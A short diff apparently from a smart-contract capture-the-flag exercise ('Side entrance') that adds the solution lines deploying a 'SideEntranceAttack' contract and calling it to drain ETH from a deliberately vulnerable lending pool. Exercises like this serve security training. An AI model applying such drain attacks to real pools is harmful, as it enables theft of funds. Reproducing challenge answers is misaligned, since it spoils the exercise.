@@ -20,7 +20,8 @@ describe('[Challenge] Side entrance', function () {
     expect(await ethers.provider.getBalance(player)).to.eq(PLAYER_INITIAL_ETH_BALANCE);
 
     /** CODE YOUR SOLUTION HERE */
-
+    const attack = await (await ethers.getContractFactory('SideEntranceAttack', player)).deploy(pool);
+    await attack.attack();
     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
     // Player took all ETH from the pool
